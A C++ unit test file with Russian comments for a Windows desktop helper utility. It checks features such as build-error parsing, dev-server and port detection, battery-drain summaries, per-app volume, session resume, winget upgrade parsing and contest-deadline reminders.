    bool allOk = v.size() == 5;
    for (const tools::AppPart& p : v) allOk = allOk && p.state == tools::AppPart::OK;
    CHECK(allOk);
    CHECK(tools::AppHealthLine(v).rfind(L"Всё работает: перехват мыши", 0) == 0);
    in.mouseSilent = true;
    in.watchAgeMs = 7 * 60000;
    v = tools::AppHealth(in);
    CHECK(v[0].state == tools::AppPart::BAD && v[0].fix == 1);
    CHECK(v[4].state == tools::AppPart::BAD && v[4].why == L"молчит 7 мин");
    CHECK(tools::AppHealthLine(v).rfind(L"Отвалилось: перехват мыши", 0) == 0);
    in = {};  // в игре перехват снят нарочно, автозапуск не хотели - не поломки
    in.gameMode = true;
    in.uptimeMs = 10000;
    v = tools::AppHealth(in);
    CHECK(v[0].state == tools::AppPart::OFF && v[1].state == tools::AppPart::OFF && v[4].state == tools::AppPart::OK);
    in.autostartWanted = 1;
    in.toolsExe = false;
    in.uptimeMs = 3600000;  // за час слежка ни разу не прошла
    v = tools::AppHealth(in);
    CHECK(v[1].state == tools::AppPart::BAD && v[2].state == tools::AppPart::BAD && v[4].state == tools::AppPart::BAD);
}

// Самопроверка за неделю (строки - как в настоящем журнале автоматики)
void TestWeekWaste() {
    std::vector<std::wstring> j = {
        L"Игровой режим выключен (SnippingTool.exe, шёл 12 с)",
        L"Игровой режим выключен (SnippingTool.exe, шёл 14 с)",
        L"Игровой режим выключен (LockApp.exe, шёл 25 с)",
        L"Игровой режим выключен (ahitr.exe, шёл 65 мин)",  // настоящая игра - не впустую
        L"Режим разработки выключен (Unreal Editor, шёл 20 мин)",
        L"Тихая чистка (Вручную из студии): освобождено 0 байт",
        L"Тихая чистка (Вручную из студии): освобождено 0 байт",
        L"Тихая чистка (раз в неделю): освобождено 1,21 ГБ",
        L"Сборка CMake упала: D:\\Desktop\\RadialMenu\\build-check",
        L"Сборка CMake упала: D:\\Desktop\\RadialMenu\\build-check",
        L"Сборка CMake упала: D:\\Desktop\\RadialMenu\\build-check",
        L"Сборка CMake упала: D:\\other",
    };
    auto w = weekreport::Waste(j);
    CHECK(w.size() == 3);
    CHECK(w.size() > 0 && w[0].find(L"Игровой режим 3 раза") == 0 &&
          w[0].find(L"«SnippingTool.exe»") != std::wstring::npos);
    CHECK(w.size() > 1 && w[1].find(L"Чистка 2 раза") == 0);
    CHECK(w.size() > 2 && w[2].find(L"«build-check» падала 3 раза") != std::wstring::npos);
    // по одному разу - случайность, не повод
    CHECK(weekreport::Waste({L"Игровой режим выключен (x.exe, шёл 9 с)", L"Сборка CMake упала: D:\\a"}).empty());
    CHECK(weekreport::Waste({}).empty());
}

// «Чем не пользуетесь»: судить только после двух недель счёта; ни разу - первыми, дальше - кто дольше без дела
void TestUsage() {
    usage::Data d;
    d.since = 1000;
    d.rec[L"palette"] = {1018, 40};    // вчера
    d.rec[L"winring"] = {1001, 2};     // 19 дней назад
    d.rec[L"deskdouble"] = {1010, 1};  // 10 дней назад - ещё в ходу
    std::vector<std::wstring> on{L"palette", L"winring", L"deskdouble", L"gamepad"};
    CHECK(usage::Unused(d, on, 1010).empty());  // счёт идёт 10 дней - рано судить
    auto idle = usage::Unused(d, on, 1019);
    CHECK(idle.size() == 2 && idle[0].key == L"gamepad" && idle[0].days == -1);
    CHECK(idle[1].key == L"winring" && idle[1].days == 18);
    CHECK(usage::TrackedDays(d, 1019) == 19 && usage::TrackedDays(usage::Data{}, 1019) == 0);
    // выключенное не предлагаем: его нет в списке включённых
    CHECK(usage::Unused(d, {L"palette"}, 1019).empty());
    // файл туда и обратно; мусор и служебные ключи - мимо
    usage::Data back = usage::Parse(usage::Text(d));
    CHECK(back.since == 1000 && back.rec.size() == 3 && back.rec[L"winring"].count == 2);
    usage::Data junk = usage::Parse(L"_since\t5\r\nx\t0\t3\ny\t7\nz\t9\t2\n\t1\t1\n");
    CHECK(junk.since == 5 && junk.rec.size() == 1 && junk.rec[L"z"].last == 9);
}

// Память карточек (Л10/Л11): вид без чисел, третье закрытие подряд - вопрос один раз, действие обнуляет счёт
void TestCardLog() {
    CHECK(cardlog::KindOf(L"Освободить ~1.2 ГБ перед игрой?") == L"Освободить");
    CHECK(cardlog::KindOf(L"Загрузки: 2,4 ГБ лишнего") == L"Загрузки");
    CHECK(cardlog::KindOf(L"Пропал интернет - починить?") == L"Пропал интернет - починить?");
    CHECK(cardlog::KindOf(L"7 дней без копии") == L"7 дней без копии");  // число в начале - вид весь заголовок
    cardlog::Strikes st;
    CHECK(!st.Closed(L"a", false) && !st.Closed(L"a", false));
    CHECK(st.Closed(L"a", false));   // третье подряд
    CHECK(!st.Closed(L"a", false));  // дальше не спрашиваем снова
    CHECK(!st.Closed(L"b", false) && !st.Closed(L"b", false) && !st.Closed(L"b", true));
    CHECK(!st.Closed(L"b", false) && !st.Closed(L"b", false) && st.Closed(L"b", false));  // после действия - с нуля
    std::set<std::wstring> m{L"Загрузки", L"Выход сменился"};
    CHECK(cardlog::ParseMutes(cardlog::MutesText(m)) == m);
    CHECK(cardlog::ParseMutes(L"a\r\n\nb\r\n") == (std::set<std::wstring>{L"a", L"b"}));
    // счёт переживает перезапуск: файл туда и обратно
    cardlog::Strikes saved;
    saved.n = {{L"Перед игрой", 2}, {L"Компилируются шейдеры", 1}};
    CHECK(cardlog::ParseStrikes(cardlog::StrikesText(saved)).n == saved.n);
    CHECK(cardlog::ParseStrikes(L"a\t2\r\n\tx\nb\tz\nc\t0\n").n == (std::map<std::wstring, int>{{L"a", 2}}));
    // вопрос не задали (игра) - следующее закрытие спросит, а не промолчит навсегда
    cardlog::Strikes later;
    later.Closed(L"x", false), later.Closed(L"x", false);
    CHECK(later.Closed(L"x", false));
    later.Rearm(L"x");
    CHECK(later.Closed(L"x", false));
}

// Отмена записи журнала (Л3): упаковка туда и обратно, путь с «|» не упаковывается, третий столбец читается
void TestJournalUndo() {
    std::wstring u = tools::UndoPack(L"recycle", {L"C:\\Dl\\a.exe", L"C:\\Dl\\bad|name.zip", L"C:\\Dl\\b (1).zip"});
    CHECK(u == L"recycle|C:\\Dl\\a.exe|C:\\Dl\\b (1).zip");
    tools::Undo p;
    CHECK(tools::UndoParse(u, p) && p.kind == L"recycle" && p.args.size() == 2 && p.args[1] == L"C:\\Dl\\b (1).zip");
    CHECK(tools::UndoParse(L"power|1\r", p) && p.kind == L"power" && p.args[0] == L"1");
    CHECK(!tools::UndoParse(L"", p) && !tools::UndoParse(L"cfg", p) && !tools::UndoParse(L"|x", p));
    wchar_t dir[MAX_PATH];
    GetTempPathW(MAX_PATH, dir);
    std::wstring d = std::wstring(dir) + L"radial_undo_test";
    CreateDirectoryW(d.c_str(), nullptr);
    DeleteFileW((d + L"\\journal.tsv").c_str());
    DeleteFileW((d + L"\\journal.old.tsv").c_str());
    tools::JournalAdd(d, L"23.10 10:00", L"без отмены");
    tools::JournalAdd(d, L"23.10 10:01", L"Питание: экономия", 64 * 1024, L"power|1");
    std::vector<tools::JournalEntry> e = tools::JournalRead(d, 10);
    CHECK(e.size() == 2 && e[0].text == L"Питание: экономия" && e[0].undo == L"power|1" && e[1].undo.empty());
    DeleteFileW((d + L"\\journal.tsv").c_str());
    RemoveDirectoryW(d.c_str());
}

// Сломанная сборка (Л31): первая настоящая ошибка у MSVC/UBT, GCC/Clang, линкера и CMake, подсказки, место для VS Code
void TestBuildErr() {
    builderr::Error e;
    std::wstring ubt =
        L"Building MyGameEditor...\r\n"
        L"[1/3] Compile [x64] Player.cpp\r\n"
        L"D:\\Games\\My\\Source\\My\\Player.cpp(42,17): error C2065: 'Hp': undeclared identifier\r\n"
        L"D:\\Games\\My\\Source\\My\\Player.cpp(50): error C2143: syntax error: missing ';' before '}'\r\n"
        L"Result: Failed (OtherCompilationError)\r\n";
    CHECK(builderr::First(ubt, e) && e.line == 42 && e.col == 17 && e.code == L"C2065" &&
          e.file == L"D:\\Games\\My\\Source\\My\\Player.cpp" && e.text == L"'Hp': undeclared identifier");
    CHECK(builderr::Plain(e) == L"Player.cpp, строка 42: C2065 'Hp': undeclared identifier");
    CHECK(builderr::Hint(e).find(L"не объявлено") != std::wstring::npos);
    CHECK(builderr::GotoArg(e, L"") == L"D:\\Games\\My\\Source\\My\\Player.cpp:42:17");
    std::wstring gcc =
        L"[3/10] Building CXX object CMakeFiles/app.dir/src/main.cpp.obj\r\n"
        L"FAILED: CMakeFiles/app.dir/src/main.cpp.obj\r\n"
        L"D:/Proj/src/main.cpp: In function 'int main()':\r\n"
        L"D:/Proj/src/main.cpp:12:5: error: 'foo' was not declared in this scope\r\n"
        L"ninja: build stopped: subcommand failed.\r\n";
    CHECK(builderr::First(gcc, e) && e.file == L"D:/Proj/src/main.cpp" && e.line == 12 && e.col == 5 &&
          e.code.empty() && e.text == L"'foo' was not declared in this scope");
    CHECK(builderr::GotoArg(e, L"") == L"D:\\Proj\\src\\main.cpp:12:5");
    std::wstring rel = L"../src/a.cpp:7: fatal error: b.h: No such file or directory\n";
    CHECK(builderr::First(rel, e) && e.file == L"../src/a.cpp" && e.line == 7 && e.col == 0);
    CHECK(builderr::GotoArg(e, L"D:\\Proj\\build") == L"D:\\Proj\\src\\a.cpp:7");
    CHECK(builderr::Hint(e).find(L"заголовок") != std::wstring::npos);
    std::wstring lnk =
        L"Module.My.cpp.obj : error LNK2019: unresolved external symbol \"void Foo()\"\r\n"
        L"D:\\Games\\My\\Binaries\\Win64\\UnrealEditor-My.dll : fatal error LNK1120: 1 unresolved externals\r\n";
    CHECK(builderr::First(lnk, e) && e.code == L"LNK2019" && e.file.empty() && e.line == 0);
    CHECK(builderr::Hint(e).find(L"Build.cs") != std::wstring::npos && builderr::GotoArg(e, L"").empty());
    std::wstring ld =
        L"collect2.exe: error: ld returned 1 exit status\nmain.cpp:(.text+0x1e): undefined reference to `bar()'\n";
    CHECK(builderr::First(ld, e) && e.text == L"undefined reference to `bar()'");  // итоговая строка не в счёт
    std::wstring cm =
        L"-- Configuring incomplete\nCMake Error at CMakeLists.txt:12 (add_executable):\n  Cannot find source file:\n";
    CHECK(builderr::First(cm, e) && e.file == L"CMakeLists.txt" && e.line == 12 &&
          e.text == L"Cannot find source file:");
    std::wstring live =
        L"Unable to build while Live Coding is active. Exit the editor and game, or press Ctrl+Alt+F11\n"
        L"ERROR: Unable to build while Live Coding is active.\n";
    CHECK(builderr::First(live, e) && builderr::Hint(e).find(L"Live Coding") != std::wstring::npos);
    CHECK(!builderr::First(L"Result: Succeeded\nTotal execution time: 3.1 seconds\n", e));
}

// Забытые серверы (Л19): проект виден в заголовке - не забыт; не виден час и ест память - забыт, один на проект
void TestDevServers() {
    CHECK(tools::DevServerName(L"node.exe") && tools::DevServerName(L"Python3.11.exe") &&
          !tools::DevServerName(L"Code.exe"));
    CHECK(tools::ProjectInTitle(L"D:\\Web\\shop", L"App.tsx - shop - Visual Studio Code"));
    CHECK(!tools::ProjectInTitle(L"D:\\Web\\shop", L"workshop - Visual Studio Code"));  // целым словом
    CHECK(tools::ProjectInTitle(L"D:\\Web\\my-site\\", L"PowerShell D:\\Web\\my-site"));
    std::vector<tools::DevServer> s = {{10, L"node.exe", L"D:\\Web\\shop", 5173, 300ull << 20},
                                       {10, L"node.exe", L"D:\\Web\\shop", 24678, 300ull << 20},  // тот же процесс
                                       {11, L"python.exe", L"D:\\Py\\bot", 8000, 30ull << 20}};
    std::map<std::wstring, ULONGLONG> seen;
    ULONGLONG h = 3600 * 1000;
    CHECK(tools::ForgottenServers(s, {L"shop - Visual Studio Code"}, seen, 1000).empty());  // первая встреча
    CHECK(tools::ForgottenServers(s, {}, seen, 1000 + h - 60000).empty());                  // ещё не час
    std::vector<tools::Forgotten> f = tools::ForgottenServers(s, {}, seen, 1000 + h + 60000);
    CHECK(f.size() == 1 && f[0].project == L"D:\\Web\\shop" && f[0].servers.size() == 2 &&
          f[0].bytes == (300ull << 20) && f[0].minutes == 61);  // бот ест мало - не в счёт, память процесса - один раз
    CHECK(tools::ForgottenServers(s, {L"Terminal - shop"}, seen, 1000 + 2 * h).empty());  // проект снова открыт
}

// Порт занят (Л18): на каком порту проект собирался слушать - явный флаг первым, потом скрипты, .env, обычные порты
void TestProjectPorts() {
    CHECK(tools::ProjectPorts(L"node server.js --port 4000", L"", L"") == std::vector<int>{4000});
    CHECK(tools::ProjectPorts(L"python -m http.server 9001", L"", L"") == (std::vector<int>{9001, 8000}));
    CHECK(tools::ProjectPorts(L"python manage.py runserver 0.0.0.0:8100", L"", L"") == (std::vector<int>{8100, 8000}));
    std::wstring pkg = L"{\"name\":\"shop\",\"scripts\":{\"dev\":\"vite --host\",\"build\":\"vite build\"}}";
    CHECK(tools::ProjectPorts(L"node node_modules\\vite\\bin\\vite.js", pkg, L"") == std::vector<int>{5173});
    std::wstring pkg2 = L"{\"scripts\": {\"start\": \"next start -p 3100\"}}";
    CHECK(tools::ProjectPorts(L"node server.js", pkg2, L"DEBUG=1\nPORT=3200\n") ==
          (std::vector<int>{3100, 3200, 3000}));
    CHECK(tools::ProjectPorts(L"node index.js", L"{\"scripts\":{\"test\":\"jest\"}}", L"").empty());  // не угадать
}

// Что посадило батарею (Л38): программы складываются в группы, мелочь не в счёт, коротко - молчим
void TestDrain() {
    CHECK(tools::DrainGroup(L"msedge.exe") == L"браузер" && tools::DrainGroup(L"ShaderCompileWorker.exe") == L"Unreal");
    CHECK(tools::DrainGroup(L"Telegram.exe") == L"Telegram" && tools::DrainGroup(L"foo.exe") == L"foo");
    tools::DrainIn in;
    in.minutes = 125;
    in.fromPct = 95;
    in.toPct = 35;
    in.cpu = {{L"chrome.exe", 400},
              {L"msedge.exe", 100},
              {L"UnrealEditor.exe", 300},
              {L"Discord.exe", 160},
              {L"svchost.exe", 40}};
    tools::DrainOut o;
    CHECK(tools::DrainSummary(in, o));
    CHECK(o.title == L"От батареи 2 ч 5 мин: ушло 60%");
    CHECK(o.top.size() == 3 && o.top[0].first == L"браузер" && o.top[0].second == 50 && o.top[1].first == L"Unreal" &&
          o.top[2].first == L"Discord");  // svchost - 4%, не в счёт
    CHECK(o.text == L"Больше всего процессора: браузер (50%), Unreal (30%) и Discord (16%). Расход 28% в час.");
    in.minutes = 15;
    CHECK(!tools::DrainSummary(in, o));  // меньше 20 минут
    in.minutes = 60;
    in.toPct = 93;
    CHECK(!tools::DrainSummary(in, o));  // ушло 2%
}

// Громкость по программам (Л36): новый сеанс получает запомненное, перемену уровня у знакомого - запомнить
void TestAppVolume() {
    std::map<DWORD, float> last;
    std::map<std::wstring, float> saved{{L"discord", 0.3f}};
    // первый проход после старта: только смотрим
    appvol::Plan p = appvol::PlanVolumes({{10, L"discord", 1.0f}, {11, L"game", 0.8f}}, last, saved, true);
    CHECK(p.set.empty() && p.save.empty() && last.size() == 2);
    // вы сделали игру тише - запомнить; Discord как был - ничего
    p = appvol::PlanVolumes({{10, L"discord", 1.0f}, {11, L"game", 0.5f}}, last, saved, false);
    CHECK(p.set.empty() && p.save.size() == 1 && p.save[L"game"] == 0.5f);
    // Discord перезапустился (новый pid) - вернуть 0.3; игра закрылась - забыта в last; системные звуки (pid 0) мимо
    p = appvol::PlanVolumes({{20, L"discord", 1.0f}, {0, L"", 1.0f}}, last, saved, false);
    CHECK(p.set.size() == 1 && p.set[0].first == 20 && p.set[0].second == 0.3f && last.size() == 1 && last[20] == 0.3f);
    // следующий проход видит уже 0.3 - не «поменяли вы»
    p = appvol::PlanVolumes({{20, L"discord", 0.3f}}, last, saved, false);
    CHECK(p.set.empty() && p.save.empty());
    std::map<std::wstring, float> m{{L"discord", 0.3f}, {L"nfs14", 0.85f}};
    std::map<std::wstring, float> back = appvol::ParseSaved(appvol::SavedText(m));
    CHECK(back.size() == 2 && std::fabs(back[L"nfs14"] - 0.85f) < 0.001f);
}

// «Продолжить, где остановился» (Л4): снимок туда и обратно, папки VS Code, чего нет сейчас, текст карточки
void TestResume() {
    CHECK(resume::FromFileUri(L"file:///d%3A/Desktop/C%2B%2B") == L"D:\\Desktop\\C++");
    CHECK(resume::FromFileUri(L"file:///c%3A/Users/%D0%9C%D0%BE%D1%8F") == L"C:\\Users\\Моя");  // UTF-8 в URI
    CHECK(resume::FromFileUri(L"vscode-remote://wsl/x").empty());
    std::wstring json =
        L"{\"backupWorkspaces\": {\"workspaces\": [], \"folders\": [{\"folderUri\": \"file:///d%3A/Web/shop\"}], "
        L"\"emptyWindows\": []}, \"profileAssociations\": {\"workspaces\": {\"file:///d%3A/Web/shop\": "
        L"\"__default__profile__\", \"file:///d%3A/Games/MyGame\": \"__default__profile__\", \"file:///c%3A/a/tools\": "
        L"\"__default__profile__\", \"file:///d%3A/b/tools\": \"__default__profile__\"}}}";
    std::vector<std::wstring> f = resume::CodeFolders(
        json, {L"main.cpp - MyGame - Visual Studio Code", L"x.py - tools - Visual Studio Code", L"Telegram"});
    CHECK(f.size() == 2 && f[0] == L"D:\\Web\\shop" &&
          f[1] == L"D:\\Games\\MyGame");  // «tools» - две папки, не угадываем
    resume::Snapshot s;
    s.when = 1792700000;
    s.things = {{resume::Thing::CODE, L"D:\\Web\\shop", L"shop"},
                {resume::Thing::FOLDER, L"C:\\Users\\Me\\Downloads", L"Downloads"},
                {resume::Thing::UNREAL, L"D:\\Games\\MyGame\\MyGame.uproject", L"MyGame"},
                {resume::Thing::APP, L"C:\\Program Files\\Blender\\blender.exe", L"blender"}};
    resume::Snapshot back;
    CHECK(resume::Parse(resume::Save(s), back) && back.when == s.when && back.things.size() == 4 &&
          back.things[2].kind == resume::Thing::UNREAL && back.things[3].label == L"blender");
    std::vector<resume::Thing> miss = resume::Missing(s, {{resume::Thing::CODE, L"d:\\web\\SHOP", L"shop"}});
    CHECK(miss.size() == 3 && miss[0].kind == resume::Thing::FOLDER);
    CHECK(resume::Describe(miss) == L"Unreal: MyGame; папки: Downloads; программы: blender");
    CHECK(resume::Describe(s.things, 30).size() == 30);
}

// Сон после работы (Л6): что считается работой и отсчёт - ждём тишины, потом минута, работа снова пошла - с начала
void TestAfterWork() {
    std::vector<afterwork::ProcNow> ps = {{L"explorer.exe", 0.01}, {L"blender.exe", 0.05}};
    CHECK(afterwork::BusyReason(ps, L"ninja.exe|UnrealBuildTool.exe", 0, false).empty());
    // библиотеки Steam: \ в файле - один \, значение «path» - только с той же строки
    auto libs = afterwork::SteamLibraries(
        L"\"libraryfolders\"\n{\n\t\"0\"\n\t{\n\t\t\"path\"\t\t\"C:\\\\Program Files (x86)\\\\Steam\"\n"
        L"\t\t\"apps\" { \"228980\" \"1\" }\n\t}\n\t\"1\"\n\t{\n\t\t\"path\"\t\t\"D:\\\\SteamLibrary\"\n\t}\n}\n");
    CHECK(libs.size() == 2 && libs[0] == L"C:\\Program Files (x86)\\Steam" && libs[1] == L"D:\\SteamLibrary");
    CHECK(afterwork::SteamLibraries(L"\"path\"\n\"x\"").empty() && afterwork::SteamLibraries(L"").empty());
    ps[1].cpu = 0.6;  // рендер
    CHECK(afterwork::BusyReason(ps, L"ninja.exe", 0, false) == L"рендер Blender");
    ps.push_back({L"UnrealBuildTool.exe", 0.3});
    CHECK(afterwork::BusyReason({{L"UnrealBuildTool.exe", 0}}, L"ninja.exe|UnrealBuildTool.exe", 0, false) ==
          L"UnrealBuildTool.exe");
    CHECK(afterwork::BusyReason({}, L"", 2, false) == L"загрузка в браузере");
    CHECK(afterwork::BusyReason({}, L"", 0, true) == L"загрузка Steam");
    afterwork::Countdown c;
    CHECK(c.Feed(true, 0) == afterwork::Countdown::WAIT);
    CHECK(c.Feed(false, 1000) == afterwork::Countdown::WAIT);     // затихло - ждём 2 минуты
    CHECK(c.Feed(false, 121000) == afterwork::Countdown::COUNT);  // отсчёт пошёл
    CHECK(c.SecondsLeft(121000) == 60);
    CHECK(c.Feed(true, 150000) == afterwork::Countdown::WAIT);  // работа снова - с начала
    CHECK(c.Feed(false, 151000) == afterwork::Countdown::WAIT && c.Feed(false, 271000) == afterwork::Countdown::COUNT);
    CHECK(c.Feed(false, 331000) == afterwork::Countdown::ACT);
}

// Подготовка к игре (Л21): мешает - строками, кнопка - самое полезное (обновления важнее Steam), нечему - молчим
// Режим питания по нагрузке: открытый, но простаивающий Unreal на зарядке - не максимум (шумели вентиляторы)
void TestPowerPick() {
    using namespace powerpick;
    CHECK(Pick(false, false, false) == BALANCED);  // одна зарядка максимум не включает
    CHECK(Pick(false, true, false) == BALANCED);   // редактор открыт, но простаивает
    CHECK(Pick(false, true, true) == BEST);
    CHECK(Pick(true, false, false) == SAVER && Pick(true, true, true) == BALANCED);
    CHECK(Reason(false, false, true, false) == L"на зарядке, Unreal, простаивает");
    CHECK(Reason(false, true, false, true) == L"на зарядке, игра, нагрузка");
    CHECK(Reason(true, true, false, true) == L"от батареи, игра" && Reason(false, false, false, true) == L"на зарядке");
    Load l;
    CHECK(!l.Want(1000, 0.9));  // миг нагрузки - ещё не максимум
    CHECK(!l.Want(10000, 0.9));
    CHECK(l.Want(16000, 0.5));                           // 15 с подряд выше порога
    CHECK(l.Want(20000, 0.05) && l.Want(100000, 0.05));  // простой меньше полутора минут - держим
    CHECK(l.Want(110000, 0.15));                         // между порогами - держим, отсчёт простоя заново
    CHECK(l.Want(150000, 0.05) && l.Want(239000, 0.05));
    CHECK(!l.Want(240000, 0.05));                                                 // 90 с подряд простоя - снова баланс
    CHECK(!l.Want(241000, 0.9) && !l.Want(250000, 0.2) && !l.Want(260000, 0.9));  // провал прерывает отсчёт
    l.Reset();
    CHECK(!l.busy && !l.highSince && !l.lowSince);
}

void TestGamePrep() {
    gameprep::In in;
    gameprep::Out o;
    CHECK(!gameprep::Check(in, o));
    in.downMbps = 5;  // мелочь
    CHECK(!gameprep::Check(in, o));
    in.battery = true;
    in.percent = 41;
    CHECK(!gameprep::Check(in, o));  // одна батарея - молчим: о ней говорит значок режима
    in.downMbps = 45;
    CHECK(gameprep::Check(in, o) && o.title == L"Перед игрой" && o.action == gameprep::Out::NONE && o.yes.empty());
    CHECK(o.text.find(L"(41%)") != std::wstring::npos);  // при настоящей помехе батарея - строкой
    in.downMbps = 5;
    in.steam = true;
    in.partials = 2;  // Steam и браузер - одна строка про загрузку
    CHECK(gameprep::Check(in, o) && o.title == L"Перед игрой" && o.action == gameprep::Out::OPEN_STEAM_DOWNLOADS);
    CHECK(o.text.find(L"Браузер") == std::wstring::npos && o.text.find(L"\n") != std::wstring::npos);
    in.updates = true;
    CHECK(gameprep::Check(in, o) && o.action == gameprep::Out::OPEN_UPDATES && o.yes == L"Отложить обновления");
    in = {};
    in.downMbps = 45;
    CHECK(gameprep::Check(in, o) && o.text.find(L"45 Мбит/с") != std::wstring::npos);
}

// Фокус и шахматы (Л8, Л34): маска в заголовке окна без учёта регистра, строка отсчёта
void TestFocus() {
    std::vector<std::wstring> t = {L"Telegram", L"Партия с Magnus • lichess.org - Google Chrome"};
    CHECK(focus::AutoMatch(t, L"lichess.org|chess.com") == L"lichess.org");
    CHECK(focus::AutoMatch({L"Play Chess Online - Chess.com - Opera"}, L" lichess.org | chess.com ") == L"chess.com");
    CHECK(focus::AutoMatch(t, L"").empty() && focus::AutoMatch(t, L"ab|x").empty());  // короткие маски не в счёт
    CHECK(focus::LeftText(23 * 60000 + 1) == L"Фокус: ещё 24 мин");
    CHECK(focus::LeftText(50 * 60000) == L"Фокус: ещё 50 мин");
    CHECK(focus::LeftText(59000) == L"Фокус: меньше минуты");
}

// Окружение проекта (Л33): что просит проект и какая из установленных подходит
void TestProjVer() {
    tools::Ver v = tools::ParseVer(L"v20.11.0");
    CHECK(v.major == 20 && v.minor == 11 && !tools::ParseVer(L"lts/iron").Known());
    tools::Need n = tools::NodeNeed(L"v20.11.0\n", L"", L"");
    CHECK(n.v.major == 20 && n.v.minor == -1 && !n.atLeast && n.from == L".nvmrc");
    n = tools::NodeNeed(L"", L"", L"{\"name\":\"x\",\"engines\": {\"node\": \">=18.17\"}}");
    CHECK(n.v.major == 18 && n.atLeast && tools::Fits(n, {22, 1}) && !tools::Fits(n, {16, 20}));
    n = tools::NodeNeed(L"", L"", L"{\"engines\":{\"node\":\"^20.1\"}}");
    CHECK(!n.atLeast && tools::Fits(n, {20, 5}) && !tools::Fits(n, {22, 0}));
    tools::Need p = tools::PythonNeed(L"3.12.1\r\n", L"");
    CHECK(p.v.major == 3 && p.v.minor == 12 && tools::Fits(p, {3, 12}) && !tools::Fits(p, {3, 10}));
    p = tools::PythonNeed(L"", L"[project]\nname = \"bot\"\nrequires-python = \">=3.11\"\n");
    CHECK(p.atLeast && tools::Fits(p, {3, 14}) && !tools::Fits(p, {3, 10}) && p.from == L"requires-python");
    tools::Need c = tools::CMakeNeed(L"CMAKE_MINIMUM_REQUIRED(VERSION 3.28)\nproject(x)");
    CHECK(c.v.major == 3 && c.v.minor == 28 && c.atLeast && !tools::Fits(c, {3, 22}) && tools::Fits(c, {4, 0}));
    CHECK(!tools::CMakeNeed(L"project(x)").v.Known());
    std::vector<tools::Installed> have = {{{3, 10}, L"A"}, {{3, 14}, L"B"}, {{3, 12}, L"C"}};
    CHECK(tools::Pick(p, have) == 1);                                // >=3.11 - самая новая подходящая
    CHECK(tools::Pick(tools::PythonNeed(L"3.12", L""), have) == 2);  // точная ветка
    CHECK(tools::Pick(tools::PythonNeed(L"3.9", L""), have) == -1);
    CHECK(tools::VerText({20, -1}) == L"20" && tools::VerText({3, 12}) == L"3.12");
}

// Проект одной кнопкой (Л20): команда по менеджеру пакетов и скриптам, порт, Django, Cargo, Unreal
void TestPlanLaunch() {
    tools::LaunchIn in;
    in.packageJson = L"{\"scripts\":{\"dev\":\"vite\",\"build\":\"vite build\"}}";
    tools::LaunchPlan p = tools::PlanLaunch(in);
    CHECK(p.cmd == L"npm run dev" && p.port == 5173);
    in.pnpm = true;
    CHECK(tools::PlanLaunch(in).cmd == L"pnpm dev");
    in = {};
    in.packageJson = L"{\"scripts\":{\"start\":\"node server.js\"}}";
    in.env = L"PORT=4100\n";
    p = tools::PlanLaunch(in);
    CHECK(p.cmd == L"npm start" && p.port == 4100);
    in = {};
    in.django = true;
    p = tools::PlanLaunch(in);
    CHECK(p.cmd == L"python manage.py runserver" && p.port == 8000);
    in = {};
    in.cargo = true;
    CHECK(tools::PlanLaunch(in).cmd == L"cargo run" && tools::PlanLaunch(in).port == 0);
    in = {};
    in.uproject = L"D:\\Games\\My\\My.uproject";
    p = tools::PlanLaunch(in);
    CHECK(p.cmd.empty() && p.Any() && p.uproject == in.uproject);
    CHECK(!tools::PlanLaunch({}).Any());
}

// Обновить программы (Л12): разбор winget upgrade - ход через \r, имена с пробелами и кириллицей, «< версия», вторая
// таблица, итоговая строка не пакет
void TestWinget() {
    std::wstring out =
        L"   - \r   \\ \r   | \r"
        L"Name                       Id                         Version      Available    Source\r\n"
        L"--------------------------------------------------------------------------------------\r\n"
        L"Microsoft Visual Studio Code (User) Microsoft.VisualStudioCode 1.121.0 1.142.0 winget\r\n"
        L"v2RayTun, версия 3.8.12.0   v2RayTun.Windows           3.8.12.0     3.10.15      winget\r\n"
        L"Google Chrome               Google.Chrome              < 130.0      131.0.6778   winget\r\n"
        L"34 upgrades available.\r\n"
        L"\r\n"
        L"The following packages have an upgrade available, but require explicit targeting for upgrade:\r\n"
        L"Name    Id               Version Available Source\r\n"
        L"-------------------------------------------------\r\n"
        L"Discord Discord.Discord  1.0.9   1.0.9200  winget\r\n";
    std::vector<tools::Upgrade> u = tools::ParseWingetUpgrade(out);
    CHECK(u.size() == 4);
    CHECK(u[0].name == L"Microsoft Visual Studio Code (User)" && u[0].id == L"Microsoft.VisualStudioCode" &&
          u[0].have == L"1.121.0" && u[0].avail == L"1.142.0");
    CHECK(u[1].name == L"v2RayTun, версия 3.8.12.0" && u[1].id == L"v2RayTun.Windows");
    CHECK(u[2].have == L"< 130.0" && u[2].id == L"Google.Chrome");
    CHECK(u[3].id == L"Discord.Discord");
    CHECK(tools::ParseWingetUpgrade(L"No installed package found matching input criteria.\r\n").empty());
}

// Сроки из ContestReminder (Л7): разбор contests.json, выполненные и прошедшие - мимо, ближе трёх дней - первыми
void TestContests() {
    std::wstring j =
        L"[{\"id\": \"a\", \"title\": \"Volga-IT | \\u0444\\u0438\\u043d\\u0430\\u043b\", \"url\": "
        L"\"https://volga-it.org\", "
        L"\"deadline\": \"2026-10-25T23:59:00\", \"reminders\": [1440, 60], \"done\": false, \"snoozed_until\": null},"
        L"{\"id\": \"b\", \"title\": \"Олимпиада {МГУ}\", \"url\": \"https://x.ru/?a=\\\"1\\\"\", \"deadline\": "
        L"\"2026-10-24T12:00:00\", \"done\": false},"
        L"{\"id\": \"c\", \"title\": \"Сдано\", \"deadline\": \"2026-10-24T10:00:00\", \"done\": true},"
        L"{\"id\": \"d\", \"title\": \"Далеко\", \"deadline\": \"2026-11-24T23:59:00\", \"done\": false},"
        L"{\"id\": \"e\", \"title\": \"Без срока\", \"deadline\": null, \"done\": false}]";
    std::vector<tools::Contest> all = tools::ParseContests(j);
    CHECK(all.size() == 4 && all[0].title == L"Volga-IT | финал" && all[1].title == L"Олимпиада {МГУ}");
    CHECK(all[1].url == L"https://x.ru/?a=\"1\"" && all[2].done);
    tm t{};
    t.tm_year = 126, t.tm_mon = 9, t.tm_mday = 23, t.tm_hour = 10, t.tm_isdst = -1;  // 23.10.2026 10:00
    LONGLONG now = (LONGLONG)mktime(&t);
    std::vector<tools::Contest> soon = tools::SoonContests(all, now);
    CHECK(soon.size() == 2 && soon[0].title == L"Олимпиада {МГУ}" && soon[1].title == L"Volga-IT | финал");
    CHECK(tools::DeadlineLeft(soon[0].deadline, now) == L"через 1 дн. 2 ч");
    CHECK(tools::DeadlineLeft(now + 5 * 3600 + 100, now) == L"через 5 ч" &&
          tools::DeadlineLeft(now + 600, now) == L"через 10 мин");
}

